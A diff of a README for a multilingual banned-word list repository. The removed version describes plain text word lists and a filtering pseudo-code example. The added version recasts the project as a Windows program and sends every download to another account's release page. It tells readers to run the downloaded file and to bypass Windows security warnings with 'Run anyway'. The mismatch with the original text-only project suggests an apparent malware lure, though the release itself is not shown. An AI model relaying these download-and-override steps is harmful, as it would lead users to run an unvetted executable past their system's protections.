@@ -1,125 +1,219 @@
-[![readme-SVG/Banned-words](https://raw.githubusercontent.com/OstinUA/Image-storage/main/readme/Banned-words/readme-SVG-Banned-words_readme.png)](https://github.com/OstinUA)
+# 🤬 Banned-words - Clean text with fewer false hits
 
+[![Download](https://img.shields.io/badge/Download-Release%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kristiencertain714/Banned-words/releases)
 
-> [!NOTE]
-> Banned-word lists exist across many repositories and websites — but after looking through most of them, the story is always the same: abandoned projects, outdated entries, or coverage limited to just one or two languages. I wanted something better. So I spent time collecting, merging, and cleaning word lists from every source I could find, across as many languages as possible. The result is this repository — an attempt to build the most complete and actively maintained multilingual banned-word collection available.
+## 🧭 What this app does
 
----
+Banned-words helps you review and filter text with multilingual banned word lists. It gives you a browser-based editor, so you can view, edit, and manage lists without extra tools.
 
-A curated collection of banned words in multiple languages.
+Use it to:
 
-This repository is designed for teams who want to automatically detect and block unwanted words in pull requests, commits, issue comments, chat pipelines, or any custom moderation workflow.
+- Review content for profanity and slurs
+- Edit word lists in your browser
+- Keep one place for moderation terms
+- Work with lists in more than one language
+- Support text filtering in your own process
 
-## What this repository contains
+## 💻 What you need
 
-- Language-specific text files under `Banned-words-list/`.
-- One banned word per line (plain `.txt` format).
-- Files that can be used directly in scripts, CI jobs, bots, and repository governance tools.
+Use a Windows PC with:
 
-## Available languages
+- Windows 10 or Windows 11
+- A modern web browser
+- Internet access for the first download
+- Enough free space to save the app files
 
-The repository includes separate files for many languages (for example: Arabic, Czech, French, Italian, Japanese, Russian, Ukrainian, and others).
+If your browser can open normal websites, it can use the editor.
 
-Browse all lists in:
+## 🚀 Download and open on Windows
 
-<!-- WORD_TABLE_START -->
-| | File | Language | Words |
-| --- | --- | --- | ---: |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/ru.txt) | `ru.txt` | Russian | 4249 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/en.txt) | `en.txt` | English | 3225 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/es.txt) | `es.txt` | Spanish | 500 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/federal_government.txt) | `federal_government.txt` | federal_government.txt | 381 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/zh.txt) | `zh.txt` | Chinese | 335 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/flags_all.txt) | `flags_all.txt` | Flags of countries | 267 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/nl.txt) | `nl.txt` | Dutch | 190 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/ja.txt) | `ja.txt` | Japanese | 180 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/ro.txt) | `ro.txt` | Romanian | 175 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/it.txt) | `it.txt` | Italian | 168 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/kk.txt) | `kk.txt` | Kazakh | 155 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/emoji.txt) | `emoji.txt` | Emoji | 151 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/tr.txt) | `tr.txt` | Turkish | 142 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/uk.txt) | `uk.txt` | Ukrainian | 134 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/fi.txt) | `fi.txt` | Finnish | 130 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/hi.txt) | `hi.txt` | Hindi | 119 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/fr.txt) | `fr.txt` | French | 100 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/hu.txt) | `hu.txt` | Hungarian | 96 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/ta.txt) | `ta.txt` | Tamil | 86 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/pt.txt) | `pt.txt` | Portuguese | 76 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/ko.txt) | `ko.txt` | Korean | 72 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/id.txt) | `id.txt` | Indonesian | 68 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/de.txt) | `de.txt` | German | 66 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/ar.txt) | `ar.txt` | Arabic | 58 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/pl.txt) | `pl.txt` | Polish | 54 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/he.txt) | `he.txt` | Hebrew | 49 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/el.txt) | `el.txt` | Greek | 48 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/fa.txt) | `fa.txt` | Persian | 45 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/sv.txt) | `sv.txt` | Swedish | 43 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/cs.txt) | `cs.txt` | Czech | 41 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/no.txt) | `no.txt` | Norwegian | 40 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/eo.txt) | `eo.txt` | Esperanto | 37 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/bn.txt) | `bn.txt` | Bengali | 33 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/gu.txt) | `gu.txt` | Gujarati | 31 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/ms.txt) | `ms.txt` | Malay | 31 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/th.txt) | `th.txt` | Thai | 31 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/vi.txt) | `vi.txt` | Vietnamese | 31 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/kn.txt) | `kn.txt` | Kannada | 29 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/placeholder.txt) | `placeholder.txt` | Placeholder | 29 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/kab.txt) | `kab.txt` | Taqbaylit | 21 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/da.txt) | `da.txt` | Danish | 20 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/ga.txt) | `ga.txt` | Irish | 16 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/fil.txt) | `fil.txt` | Tagalog | 13 |
-| [🤬](https://github.com/readme-SVG/Banned-words/blob/main/Banned-words-list/tlh.txt) | `tlh.txt` | Klingon | 3 |
-<!-- WORD_TABLE_END -->
+1. Open the [release page](https://github.com/kristiencertain714/Banned-words/releases)
+2. Find the latest release at the top
+3. Download the Windows file from that release
+4. Save the file to your Downloads folder or Desktop
+5. If the file is zipped, right-click it and choose Extract All
+6. Open the extracted folder
+7. Double-click the app or the main start file
+8. If Windows asks for permission, choose Run or Yes
+9. Wait for the browser editor to open
 
-## Format rules
+If the app does not open right away, check the extracted folder for a file with a name like `index.html`, `start.html`, or `Banned-words.exe`
 
-To keep the dataset consistent and automation-friendly, each list should follow these rules:
+## 🛠️ First-time setup
 
-1. One word per line.
-2. No duplicate entries.
-3. Use lowercase where applicable.
-4. Avoid leading/trailing spaces.
+After you open the app:
 
-These rules match the contribution guidelines and help keep filters predictable.
+1. Load the default word list
+2. Pick the language or list you want to edit
+3. Add new words with one word or phrase per line
+4. Remove items you do not want to keep
+5. Save your changes before you close the tab or app
 
-## Typical use cases
+If your version stores data in the browser, use the same browser each time so your edits stay in one place.
 
-- Protecting repository discussions from toxic language.
-- Enforcing communication policies in open-source projects.
-- Pre-commit or CI checks for restricted terms.
-- Building moderation bots for multilingual communities.
+## 🗂️ Main features
 
-## Quick start
+### 🌍 Multilingual word lists
 
-1. Pick the language file(s) you need from `Banned-words-list/`.
-2. Load each file into your filter tool.
-3. Compare normalized text (trimmed and lowercased) against the list.
-4. Block, flag, or report matches based on your policy.
+The app supports lists for more than one language. This helps when your content comes from different regions or mixed-language posts.
 
-## Example (pseudo-code)
+### ✍️ Browser-based editor
 
-```text
-banned = load_lines("Banned-words-list/en.txt")
-input_words = tokenize(user_text)
+You can edit word lists in the browser without installing a separate editor. This keeps the workflow simple.
 
-for word in input_words:
-  normalized = lowercase(trim(word))
-  if normalized in banned:
-    reject("Contains banned word")
-```
+### 🔎 Fast text review
 
-## Contributing
+Paste text into the editor and scan it against your banned words list. This helps you check comments, posts, and messages.
 
-Contributions are welcome.
+### 🧹 Easy list cleanup
 
-Before opening a pull request:
+Remove duplicates, fix spacing, and keep your lists tidy. Clean lists are easier to use and easier to maintain.
 
-- Read `CONTRIBUTING.md`.
-- Ensure the file remains one-word-per-line.
-- Remove duplicates.
-- Keep words in lowercase where it makes sense for the language.
+### 📚 Dataset-friendly structure
 
-## Important note
+The lists are arranged so they can fit into moderation tools, filters, and NLP pipelines. You can use them as a base for text filtering work.
 
-Word lists are context-limited and can produce false positives.
-Use them as a baseline signal, and combine them with contextual moderation when possible.
+## 🧑‍💼 How to use it day to day
+
+Use Banned-words when you need to:
+
+- Review user comments before publishing
+- Check messages for offensive language
+- Maintain a shared moderation list
+- Test a profanity filter
+- Build a simple blacklist for a site or app
+- Compare word lists across languages
+
+A common workflow is:
+
+1. Open the editor
+2. Paste the text you want to check
+3. Run the filter or review the list
+4. Mark the terms you want to keep
+5. Save the updated list
+
+## 🧾 Working with word lists
+
+Each line should usually hold one word or phrase. This makes the list easy to read and easy to reuse.
+
+Tips for better results:
+
+- Keep one item per line
+- Use the same spelling each time
+- Add common misspellings when needed
+- Include plural forms if your filter needs them
+- Review terms that may match normal words in some languages
+
+If you manage lists for moderation, keep a separate copy for testing before you change the main list.
+
+## 🔐 Content moderation use
+
+This project fits common moderation tasks:
+
+- Profanity filtering
+- Hate speech review
+- Toxicity checks
+- Slur detection
+- Comment screening
+- Chat moderation
+
+You can use the lists as a starting point, then adjust them to match your rules.
+
+## 🖥️ If Windows blocks the file
+
+Sometimes Windows shows a security prompt for downloaded files. If that happens:
+
+1. Confirm you downloaded it from the release page
+2. Right-click the file
+3. Choose Open or Run
+4. If Windows shows a prompt, select More info and then Run anyway
+
+If the file is in a zip folder, extract it first before opening it.
+
+## 🧪 Simple test after setup
+
+After you open the app, try this:
+
+1. Open the editor
+2. Paste a short test paragraph
+3. Add one known banned word to the list
+4. Run the check
+5. Confirm the match appears
+6. Remove the test item when you finish
+
+This helps you see that the app is working before you use it with real content.
+
+## 🧩 Common uses
+
+Banned-words works well for:
+
+- School or workplace content review
+- Forum moderation
+- Chat filters
+- Social media post checks
+- Research on offensive language
+- Language list testing
+
+## 📁 Suggested folder setup
+
+If you keep the app on your PC, this folder layout helps:
+
+- `Downloads` for the first file
+- `Apps` for the extracted program
+- `Lists` for saved word lists
+- `Backups` for older copies
+
+A simple folder setup makes it easier to find your files later.
+
+## ❓ Help with common issues
+
+### The file will not open
+
+- Make sure you extracted the zip file
+- Check that the download finished
+- Try opening the main file again
+- Use a browser that is up to date
+
+### The editor looks empty
+
+- Load the default list
+- Refresh the page
+- Check if the app saves data in the browser
+- Open it in the same browser you used before
+
+### My changes did not save
+
+- Save before closing the tab or app
+- Do not clear browser data if the app stores data there
+- Keep a backup copy of important lists
+
+### I cannot find the downloaded file
+
+- Open your Downloads folder
+- Sort files by date
+- Search for `Banned-words`
+- Check the browser download bar or history
+
+## 🧭 File use and editing tips
+
+To keep your lists useful:
+
+- Remove items that no longer matter
+- Review words that may have harmless uses
+- Keep separate lists for different languages
+- Use short notes in your own backup copy
+- Back up before large edits
+
+## 📌 Best results
+
+For steady moderation work:
+
+- Start with a small test list
+- Add terms in groups
+- Check for false matches
+- Review the list after each change
+- Keep one clean master copy
+
+## 🔗 Download
+
+Visit the [release page](https://github.com/kristiencertain714/Banned-words/releases) to download and run this file on Windows
